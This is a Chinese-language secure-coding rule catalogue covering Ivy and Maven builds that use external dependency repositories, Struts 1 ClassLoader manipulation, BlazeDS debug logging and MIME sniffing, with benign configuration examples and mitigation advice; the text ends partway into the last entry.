<h4 id="Build-Misconfiguration-External-Ivy-Dependency-Repository"><a href="#Build-Misconfiguration-External-Ivy-Dependency-Repository" class="headerlink" title="Build Misconfiguration: External Ivy Dependency Repository"></a>Build Misconfiguration: External Ivy Dependency Repository</h4><h5 id="ABSTRACT-177"><a href="#ABSTRACT-177" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>这一 Ant 编译脚本依赖于外部数据源，这会导致攻击者能够将恶意代码插入最终产品中，或者控制编译计算机。</p>
<h5 id="EXPLANATION-178"><a href="#EXPLANATION-178" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Java 开发环境内存在的几个工具能够辅助 dependency 管理：Apache Ant 和 Apache Maven 两种 build system 都包含专门用来帮助管理 dependency 的功能，Apache Ivy 被明确作为 dependency 管理器来部署。尽管这些工具在行为方式上存在差异，但它们都有一种通用的功能，即会自动下载在编译过程中指定的外部 dependency。这样一来，两个不同的开发人员用同一种方式来编译软件就容易得多。开发人员只需在编译文件中存储 dependency 信息，这意味着每个开发人员和编译工程师都通过同一种方式来获得 dependency、编译代码以及进行部署，而不需要进行混乱的手动 dependency 管理。以下的例子演示了如何使用 Ivy、Ant 和 Maven 作为编译过程的一部分来管理外部 dependency。</p>
<p>采用 Ivy 时，开发人员将具体指定 dependency 的名称和版本，而不是列出从中检索 dependency 的显式 URL，Ivy 依靠其底层配置来识别要从中检索 dependency 的服务器。通用组件使得开发人员不必花时间探查 dependency 的具体位置。</p>
<p>例 1：以下内容摘自 Ivy 的 ivy.xml 文件，这些内容显示了开发人员如何用名称和版本来指定多项外部 dependency：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependency org=&quot;javax.servlet&quot;</span><br><span class="line"></span><br><span class="line">             name=&quot;servletapi&quot;</span><br><span class="line"></span><br><span class="line">              rev=&quot;2.3&quot; conf=&quot;build-&gt;*&quot;/&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependency org=&quot;javax.jms&quot;</span><br><span class="line"></span><br><span class="line">             name=&quot;jms&quot;</span><br><span class="line"></span><br><span class="line">              rev=&quot;1.1&quot; conf=&quot;build-&gt;*&quot;/&gt;  ...</span><br><span class="line"></span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
<p>两种截然不同的攻击情形会影响这些系统：攻击者可能会危害托管 dependency 的服务器，也可能危害 DNS 服务器，编译计算机用它将对托管 dependency 的服务器主机名的请求重定向到被攻击者控制的计算机。这两种攻击情形都会导致攻击者能够将恶意的 dependency 版本注入到一个未受到危害的计算机上所运行的编译中。</p>
<p>不管攻击者用来投递 Trojan dependency 的攻击手段是什么，这些情形均存在一种共同的因素，即 build system 盲目地接受恶意二进制码并且将其包含在编译中。因为 build system 无法拒绝恶意的二进制码和现有安全机制（如代码审查），所以通常会关注内部开发地代码而不是外部 dependency，这种攻击深潜于内部，不易察觉，它会传播到开发环境各处并有可能传入产品中。</p>
<p>虽然手动编译过程中存在一定的 dependency 受到危害的风险，但是由于自动化 build system 存在从一个外部数据源检索 dependency 的趋势，每当 build system 运行在新环境下时，会大大增加攻击者的攻击机会。攻击者只需在 dependency 服务器或 DNS 服务器多次提取 dependency 时造成一次危害，即会危害发生编译的计算机。</p>
<h5 id="RECOMMENDATIONS-177"><a href="#RECOMMENDATIONS-177" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>最简单的解决方法是完全避免采用自动化 dependency 管理系统。手动管理 dependency 排除了由 build system 引起意外行为这一潜在危害。很显然，攻击者仍然能针对 dependency 手动检索发动上述攻击之一，但限制 dependency 的检索频率会大大减小攻击者的攻击机会。最终，这个解决方法会致使开发组织依赖于一个看起来陈旧的 build system。基于手动 dependency 管理的系统通常更难以使用和维护，并且在一些软件开发环境中可能不被接受。</p>
<p>第二种解决方法综合了传统的手动 dependency 管理方法和全自动化解决方法，这是现在流行的一种做法。手动编译过程的最大优势是减小了攻击机会，它可以通过从内部复制外部 dependency 服务器来实现一个半自动化系统。这样，任何需要利用外部 dependency 的 build system 都能用硬编码的内部 IP 地址来指向内部服务器，以此避开基于 DNS 的攻击风险。如果添加了新的 dependency 并发布了新的版本，可以一次性下载它们，并将其包含在内部存储库中。这一解决方法减小了攻击机会，并且使组织能够充分利用现有的内部网络安全基础架构。</p>
<p>要通过 Maven 实施这一解决方法，项目应该在一个单独的 Ivy 配置文件（通常为 ivyconf.xml）中对一个内部存储库的 IP 地址进行硬编码。</p>
<p>例 2：以下内容摘自 ivyconf.xml 文件，这些内容演示了正确配置的内部存储库的用法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;ivyconf&gt;</span><br><span class="line"></span><br><span class="line">  &lt;properties file=&quot;ivyconf.properties&quot;/&gt;</span><br><span class="line"></span><br><span class="line">  &lt;conf defaultResolver=&quot;default&quot; checkUpToDate=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line">  &lt;resolvers&gt;</span><br><span class="line"></span><br><span class="line">    &lt;chain name=&quot;default&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;url name=&quot;localrepo&quot; checkmodified=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;ivy</span><br><span class="line"></span><br><span class="line">pattern=&quot;http://172.16.1.13/[org]/[mod]/ivy-[rev].xml&quot;/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;artifact pattern=&quot;http://172.16.1.13/[org]/[mod]/[art]-[rev].[type]&quot;/&gt;</span><br><span class="line"></span><br><span class="line">      &lt;/url&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/chain&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/resolvers&gt;</span><br><span class="line"></span><br><span class="line">&lt;/ivyconf&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-176"><a href="#REFERENCES-176" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2)</p>
<p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[3] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001390 CAT II, APSC-DV-001430 CAT II, APSC-DV-001440 CAT II, APSC-DV-003300 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001390 CAT II, APSC-DV-001430 CAT II, APSC-DV-001440 CAT II, APSC-DV-003300 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001390 CAT II, APSC-DV-001430 CAT II, APSC-DV-001440 CAT II, APSC-DV-003300 CAT II</p>
<h4 id="Build-Misconfiguration-External-Maven-Dependency-Repository"><a href="#Build-Misconfiguration-External-Maven-Dependency-Repository" class="headerlink" title="Build Misconfiguration: External Maven Dependency Repository"></a>Build Misconfiguration: External Maven Dependency Repository</h4><h5 id="ABSTRACT-178"><a href="#ABSTRACT-178" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>这一 Maven 编译脚本依赖于外部数据源，这会导致攻击者能够将恶意代码插入最终产品中，或者控制编译计算机。</p>
<h5 id="EXPLANATION-179"><a href="#EXPLANATION-179" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Java 开发环境内存在的几个工具能够辅助 dependency 管理：Apache Ant 和 Apache Maven 两种 build system 都包含专门用来帮助管理 dependency 的功能，Apache Ivy 被明确作为 dependency 管理器来部署。尽管这些工具在行为方式上存在差异，但它们都有一种通用的功能，即会自动下载在编译过程中指定的外部 dependency。这样一来，两个不同的开发人员用同一种方式来编译软件就容易得多。开发人员只需在编译文件中存储 dependency 信息，这意味着每个开发人员和编译工程师都通过同一种方式来获得 dependency、编译代码以及进行部署，而不需要进行混乱的手动 dependency 管理。以下的例子演示了如何使用 Ivy、Ant 和 Maven 作为编译过程的一部分来管理外部 dependency。</p>
<p>采用 Maven 时，开发人员将具体指定 dependency 的名称和版本，而不是列出从中检索 dependency 的显式 URL，Maven 依靠其底层配置来识别要从中检索 dependency 的服务器。通用组件使得开发人员不必花时间探查 dependency 的具体位置。</p>
<p>例 1：以下内容摘自 Maven pom.xml 文件，这些内容显示了开发人员如何用名称和版本来指定多个外部 dependency：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;commons-logging&lt;/groupId&gt;</span><br><span class="line"></span><br><span class="line">    &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;</span><br><span class="line"></span><br><span class="line">    &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;javax.jms&lt;/groupId&gt;</span><br><span class="line"></span><br><span class="line">    &lt;artifactId&gt;jms&lt;/artifactId&gt;</span><br><span class="line"></span><br><span class="line">    &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
<p>两种截然不同的攻击情形会影响这些系统：攻击者可能会危害托管 dependency 的服务器，也可能危害 DNS 服务器，编译计算机用它将对托管 dependency 的服务器主机名的请求重定向到被攻击者控制的计算机。这两种攻击情形都会导致攻击者能够将恶意的 dependency 版本注入到一个未受到危害的计算机上所运行的编译中。</p>
<p>不管攻击者用来投递 Trojan dependency 的攻击手段是什么，这些情形均存在一种共同的因素，即 build system 盲目地接受恶意二进制码并且将其包含在编译中。因为 build system 无法拒绝恶意的二进制码和现有安全机制（如代码审查），所以通常会关注内部开发地代码而不是外部 dependency，这种攻击深潜于内部，不易察觉，它会传播到开发环境各处并有可能传入产品中。</p>
<p>虽然手动编译过程中存在一定的 dependency 受到危害的风险，但是由于自动化 build system 存在从一个外部数据源检索 dependency 的趋势，每当 build system 运行在新环境下时，会大大增加攻击者的攻击机会。攻击者只需在 dependency 服务器或 DNS 服务器多次提取 dependency 时造成一次危害，即会危害发生编译的计算机。</p>
<h5 id="RECOMMENDATIONS-178"><a href="#RECOMMENDATIONS-178" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>最简单的解决方法是完全避免采用自动化 dependency 管理系统。手动管理 dependency 排除了由 build system 引起意外行为这一潜在危害。很显然，攻击者仍然能针对 dependency 手动检索发动上述攻击之一，但限制 dependency 的检索频率会大大减小攻击者的攻击机会。最终，这个解决方法会致使开发组织依赖于一个看起来陈旧的 build system。基于手动 dependency 管理的系统通常更难以使用和维护，并且在一些软件开发环境中可能不被接受。</p>
<p>第二种解决方法综合了传统的手动 dependency 管理方法和全自动化解决方法，这是现在流行的一种做法。手动编译过程的最大优势是减小了攻击机会，它可以通过从内部复制外部 dependency 服务器来实现一个半自动化系统。这样，任何需要利用外部 dependency 的 build system 都能用硬编码的内部 IP 地址来指向内部服务器，以此避开基于 DNS 的攻击风险。如果添加了新的 dependency 并发布了新的版本，可以一次性下载它们，并将其包含在内部存储库中。这一解决方法减小了攻击机会，并且使组织能够充分利用现有的内部网络安全基础架构。</p>
<p>要通过 Maven 实施这一解决方法，项目应该在 pom.xml 中对一个内部存储库的 IP 地址进行硬编码。在 pom.xml 中明确指定 IP 地址可确保编译使用其相应的内部存储库，内部存储库与具体的项目相关联。或者，也可以在 settings.xml 中指定 IP 地址，这样使得多个项目更容易共享配置。</p>
<p>例 2：以下 Maven pom.xml 演示了显式内部 IP 地址的用法（这些条目也可以用在 settings.xml 中）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;project&gt;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  &lt;repositories&gt;</span><br><span class="line"></span><br><span class="line">    &lt;repository&gt;</span><br><span class="line"></span><br><span class="line">      &lt;releases&gt;</span><br><span class="line"></span><br><span class="line">        &lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line"></span><br><span class="line">        &lt;updatePolicy&gt;always&lt;/updatePolicy&gt;</span><br><span class="line"></span><br><span class="line">        &lt;checksumPolicy&gt;warn&lt;/checksumPolicy&gt;</span><br><span class="line"></span><br><span class="line">      &lt;/releases&gt;</span><br><span class="line"></span><br><span class="line">      &lt;snapshots&gt;</span><br><span class="line"></span><br><span class="line">        &lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line"></span><br><span class="line">        &lt;updatePolicy&gt;never&lt;/updatePolicy&gt;</span><br><span class="line"></span><br><span class="line">        &lt;checksumPolicy&gt;fail&lt;/checksumPolicy&gt;</span><br><span class="line"></span><br><span class="line">      &lt;/snapshots&gt;</span><br><span class="line"></span><br><span class="line">      &lt;id&gt;central&lt;/id&gt;</span><br><span class="line"></span><br><span class="line">      &lt;name&gt;Internal Repository&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">      &lt;url&gt;http://172.16.1.13/maven2&lt;/url&gt;</span><br><span class="line"></span><br><span class="line">      &lt;layout&gt;default&lt;/layout&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/repository&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/repositories&gt;</span><br><span class="line"></span><br><span class="line">  &lt;pluginRepositories&gt;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &lt;/pluginRepositories&gt;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-177"><a href="#REFERENCES-177" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2)</p>
<p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[3] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001390 CAT II, APSC-DV-001430 CAT II, APSC-DV-001440 CAT II, APSC-DV-003300 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001390 CAT II, APSC-DV-001430 CAT II, APSC-DV-001440 CAT II, APSC-DV-003300 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001390 CAT II, APSC-DV-001430 CAT II, APSC-DV-001440 CAT II, APSC-DV-003300 CAT II</p>
<h4 id="ClassLoader-Manipulation-Struts-1"><a href="#ClassLoader-Manipulation-Struts-1" class="headerlink" title="ClassLoader Manipulation: Struts 1"></a>ClassLoader Manipulation: Struts 1</h4><h5 id="ABSTRACT-179"><a href="#ABSTRACT-179" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 ActionForms 的 Struts 1 应用程序容易遭到 ClassLoader 操控。</p>
<h5 id="EXPLANATION-180"><a href="#EXPLANATION-180" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>ClassLoader 操控使攻击者可以访问和修改基础应用程序服务器设置。在 Tomcat 8 等一些应用程序服务器上，攻击者可以调整这些设置，以上传网壳并执行任意命令。</p>
<h5 id="RECOMMENDATIONS-179"><a href="#RECOMMENDATIONS-179" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>当前尚无可用的修补程序来阻止 ClassLoader 操控攻击，并且自 Struts 1 达到其寿终状态以来，还没有推出任何修补程序来防止 Struts 1 用户免受此攻击。</p>
<p>为了能够缓解这种情况，强烈建议安装 Servlet 过滤器，以保护 Struts 1 Servlet 免受 ClassLoader 操控攻击。可在此位置找到 Servlet 过滤器的最新版本：<a href="https://github.com/rgielen/struts1filter。" target="_blank" rel="noopener">https://github.com/rgielen/struts1filter。</a></p>
<p>要使用该过滤器，请将以下过滤器声明以及适当的映射添加到要保护的 Struts 1 应用程序的 web.xml 描述符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-name&gt;ParamFilter&lt;/filter-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-class&gt;net.rgielen.struts1.filter.ParamWrapperFilter&lt;/filter-class&gt;</span><br><span class="line"></span><br><span class="line">&lt;/filter&gt;</span><br><span class="line"></span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-name&gt;ParamFilter&lt;/filter-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;YOUR ACTION SERVLET&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/filter-mapping&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-178"><a href="#REFERENCES-178" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Protect your Struts1 applications Alvaro Muñoz</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 470</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Flex-Misconfiguration-Debug-Information"><a href="#Flex-Misconfiguration-Debug-Information" class="headerlink" title="Flex Misconfiguration: Debug Information"></a>Flex Misconfiguration: Debug Information</h4><h5 id="ABSTRACT-180"><a href="#ABSTRACT-180" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>调试信息可帮助攻击者了解系统并规划攻击方式。</p>
<h5 id="EXPLANATION-181"><a href="#EXPLANATION-181" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果您使用 Blaze DS 来记录所有意外事件，services-config.xml 描述符文件将指定一个 “Logging” XML 元素来描述记录的各个方面。如下所示：</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;logging&gt;</span><br><span class="line"></span><br><span class="line">    &lt;target class=&quot;flex.messaging.log.ConsoleTarget&quot; level=&quot;Debug&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;properties&gt;</span><br><span class="line"></span><br><span class="line">            &lt;prefix&gt;[BlazeDS]&lt;/prefix&gt;</span><br><span class="line"></span><br><span class="line">            &lt;includeDate&gt;false&lt;/includeDate&gt;</span><br><span class="line"></span><br><span class="line">            &lt;includeTime&gt;false&lt;/includeTime&gt;</span><br><span class="line"></span><br><span class="line">            &lt;includeLevel&gt;false&lt;/includeLevel&gt;</span><br><span class="line"></span><br><span class="line">            &lt;includeCategory&gt;false&lt;/includeCategory&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">        &lt;filters&gt;</span><br><span class="line"></span><br><span class="line">            &lt;pattern&gt;Endpoint.*&lt;/pattern&gt;</span><br><span class="line"></span><br><span class="line">            &lt;pattern&gt;Service.*&lt;/pattern&gt;</span><br><span class="line"></span><br><span class="line">            &lt;pattern&gt;Configuration&lt;/pattern&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/filters&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/target&gt;</span><br><span class="line"></span><br><span class="line">&lt;/logging&gt;</span><br></pre></td></tr></table></figure>
<p>此 target 标签具有一个名为 level 的属性，为可选项，用来指明日志级别。如果调试级别被设置得过于详细，您的应用程序可能会向日志文件写入敏感数据。</p>
<h5 id="RECOMMENDATIONS-180"><a href="#RECOMMENDATIONS-180" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在 Blaze DS 生产环境配置文件中，不要将 level 属性指定为 Debug 或 All。</p>
<h5 id="REFERENCES-179"><a href="#REFERENCES-179" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 11</p>
<p>[2] Standards Mapping - FIPS200 CM</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II, APP3620 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II, APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II, APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II, APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II, APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II, APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II, APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="HTML5-MIME-Sniffing"><a href="#HTML5-MIME-Sniffing" class="headerlink" title="HTML5: MIME Sniffing"></a>HTML5: MIME Sniffing</h4><h5 id="ABSTRACT-181"><a href="#ABSTRACT-181" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序不会将 X-Content-Type-Options 设置为 nosniff，也不会明确禁用此安全标头。</p>
<h5 id="EXPLANATION-182"><a href="#EXPLANATION-182" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>MIME 探查是检查字节流内容以推断其中数据文件格式的一种做法。</p>
<p>如果未明确禁用 MIME 探查，则攻击者会操控部分浏览器，让其以非预期方式解析数据，从而引发 Cross-Site Scripting 攻击。对于可能包含用户可控制内容的每个页面，您应该使用 HTTP 标头 X-Content-Type-Options: nosniff。</p>
<p>示例：以下代码配置了受 Spring Security 保护的应用程序，以禁用 MIME 探查保护：</p>
